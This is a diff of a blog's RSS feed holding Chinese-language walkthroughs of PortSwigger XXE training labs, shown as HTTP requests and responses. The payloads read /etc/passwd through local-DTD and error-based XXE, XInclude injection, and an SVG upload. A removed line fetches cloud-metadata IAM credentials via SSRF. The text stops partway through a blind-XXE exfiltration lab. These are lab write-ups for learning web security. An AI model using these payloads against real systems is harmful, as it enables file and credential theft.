@@ -1,4 +1,286 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on en1r0py</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 04 Jan 2025 00:24:30 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: Exploiting XXE to perform SSRF attacks</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</link><pubDate>Sat, 04 Jan 2025 00:24:30 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: { &amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;, ... }&amp;#34;</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on en1r0py</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 05 Jan 2025 17:56:06 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: Exploiting XXE to retrieve data by repurposing a local DTD</title><link>/portswigger-posts/lab-xxe-trigger-error-message-by-repurposing-local-dtd/</link><pubDate>Sun, 05 Jan 2025 17:56:06 +0800</pubDate><guid>/portswigger-posts/lab-xxe-trigger-error-message-by-repurposing-local-dtd/</guid><description>Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34; 服务器返回报错，但是没有将a返回 根据题目提示服务器运行在GNOME桌面环境，而此环境通常在/usr/share/yelp/dtd/docbookx.dtd处有一个 DTD，其中包含一个名为ISOamso的实体。利用本地 DTD 文件和错误消息进行数据读取。发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE message [ &amp;lt;!ENTITY % local_dtd SYSTEM &amp;#34;file:///usr/share/yelp/dtd/docbookx.dtd&amp;#34;&amp;gt; &amp;lt;!ENTITY % ISOamso &amp;#39; &amp;lt;!ENTITY &amp;amp;#x25; file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY &amp;amp;#x25; eval &amp;#34; &amp;lt;!ENTITY &amp;amp;#x26;#x25; error SYSTEM &amp;amp;#x27;file:///nonexistent/&amp;amp;#x25;file;&amp;amp;#x27;&amp;gt;&amp;#34;&amp;gt; &amp;amp;#x25;eval; &amp;amp;#x25;error; &amp;#39;&amp;gt; %local_dtd; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;XML parser exited with error: java.</description><content>&lt;p>&lt;img alt="Lab description" src="/img/2025/lab-xxe-trigger-error-message-by-repurposing-local-dtd-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，但是没有将&lt;code>a&lt;/code>返回&lt;/li>
+&lt;li>根据题目提示服务器运行在GNOME桌面环境，而此环境通常在&lt;code>/usr/share/yelp/dtd/docbookx.dtd&lt;/code>处有一个 DTD，其中包含一个名为&lt;code>ISOamso&lt;/code>的实体。利用本地 DTD 文件和错误消息进行数据读取。发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE message [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY % local_dtd SYSTEM &amp;#34;file:///usr/share/yelp/dtd/docbookx.dtd&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY % ISOamso &amp;#39;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY &amp;amp;#x25; file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY &amp;amp;#x25; eval &amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY &amp;amp;#x26;#x25; error SYSTEM &amp;amp;#x27;file:///nonexistent/&amp;amp;#x25;file;&amp;amp;#x27;&amp;gt;&amp;#34;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;amp;#x25;eval;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;amp;#x25;error;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#39;&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%local_dtd;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting XXE via image file upload</title><link>/portswigger-posts/xxe-lab-xxe-via-file-upload/</link><pubDate>Sun, 05 Jan 2025 15:00:26 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xxe-via-file-upload/</guid><description>
+Solution 点击文章的View post 将下述xml内容存储为本地文件，并命名为avatar.svg &amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/hostname&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;svg width=&amp;#34;128px&amp;#34; height=&amp;#34;128px&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34; xmlns:xlink=&amp;#34;http://www.w3.org/1999/xlink&amp;#34; version=&amp;#34;1.1&amp;#34;&amp;gt;&amp;lt;text font-size=&amp;#34;16&amp;#34; x=&amp;#34;0&amp;#34; y=&amp;#34;16&amp;#34;&amp;gt;&amp;amp;xxe;&amp;lt;/text&amp;gt;&amp;lt;/svg&amp;gt; 点击文章内容中Avatar下方的Choose File，并选取本地文件上传，填写其他栏位后，点击最下方Post Comment 回到文章留言，可以看到上一步的留言，查看头像后即可获得解题所需信息 点击最上方Submit solution，并将头像图片内的解题信息填入即可解题</description><content>&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xxe-via-file-upload-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击文章的&lt;code>View post&lt;/code>&lt;/li>
+&lt;li>将下述&lt;code>xml&lt;/code>内容存储为本地文件，并命名为&lt;code>avatar.svg&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/hostname&amp;#34; &amp;gt;&lt;/span> ]&amp;gt;&lt;span style="color:#f92672">&amp;lt;svg&lt;/span> &lt;span style="color:#a6e22e">width=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;128px&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">height=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;128px&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">xmlns=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">xmlns:xlink=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.w3.org/1999/xlink&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">version=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;text&lt;/span> &lt;span style="color:#a6e22e">font-size=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;16&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">x=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;0&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">y=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;16&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&amp;amp;xxe;&lt;span style="color:#f92672">&amp;lt;/text&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击文章内容中&lt;code>Avatar&lt;/code>下方的&lt;code>Choose File&lt;/code>，并选取本地文件上传，填写其他栏位后，点击最下方&lt;code>Post Comment&lt;/code>&lt;/li>
+&lt;li>回到文章留言，可以看到上一步的留言，查看头像后即可获得解题所需信息
+&lt;img alt="Comment" src="/img/2025/xxe-lab-xxe-via-file-upload-2.jpg">
+&lt;img alt="Avatar" src="/img/2025/xxe-lab-xxe-via-file-upload-3.jpg">&lt;/li>
+&lt;li>点击最上方&lt;code>Submit solution&lt;/code>，并将头像图片内的解题信息填入即可解题&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting XInclude to retrieve files</title><link>/portswigger-posts/xxe-lab-xinclude-attack/</link><pubDate>Sun, 05 Jan 2025 14:13:58 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xinclude-attack/</guid><description>
+Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 productId=1&amp;amp;storeId=1 尝试修改productId为a POST /product/stock HTTP/2 productId=a&amp;amp;storeId=1 HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器返回报错，将productId参数设置为包含XInclude值，发送请求即可解题 POST /product/stock HTTP/2 productId=&amp;lt;foo xmlns:xi=&amp;#34;http://www.w3.org/2001/XInclude&amp;#34;&amp;gt;&amp;lt;xi:include parse=&amp;#34;text&amp;#34; href=&amp;#34;file:///etc/passwd&amp;#34;/&amp;gt;&amp;lt;/foo&amp;gt;&amp;amp;storeId=1 HTTP/2 400 Bad Request &amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</description><content>&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xinclude-attack-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=1&amp;amp;storeId=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=a&amp;amp;storeId=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: a&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，将&lt;code>productId&lt;/code>参数设置为包含&lt;code>XInclude&lt;/code>值，发送请求即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>productId=&amp;lt;foo xmlns:xi=&amp;#34;http://www.w3.org/2001/XInclude&amp;#34;&amp;gt;&amp;lt;xi:include parse=&amp;#34;text&amp;#34; href=&amp;#34;file:///etc/passwd&amp;#34;/&amp;gt;&amp;lt;/foo&amp;gt;&amp;amp;storeId=1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>/portswigger-posts/xxe-lab-xxe-with-data-retrieval-via-error-messages/</link><pubDate>Sun, 05 Jan 2025 14:00:44 +0800</pubDate><guid>/portswigger-posts/xxe-lab-xxe-with-data-retrieval-via-error-messages/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID&amp;#34; 服务器返回报错，但是没有将a返回 点击最上方Go to exploit server，构建以下Body并点击最下方的Store &amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &amp;#39;file:///invalid/%file;&amp;#39;&amp;gt;&amp;#34;&amp;gt; %eval; %exfil; 修改步骤2的请求，并新增&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY % xxe SYSTEM &amp;quot;YOUR-DTD-URL&amp;quot;&amp;gt; %xxe;]&amp;gt;在请求体中，发送请求即可解题 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;https://exploit-0a79004704633ad283a822e901fa005e.</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-xxe-with-data-retrieval-via-error-messages-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，但是没有将&lt;code>a&lt;/code>返回&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，构建以下Body并点击最下方的&lt;code>Store&lt;/code>
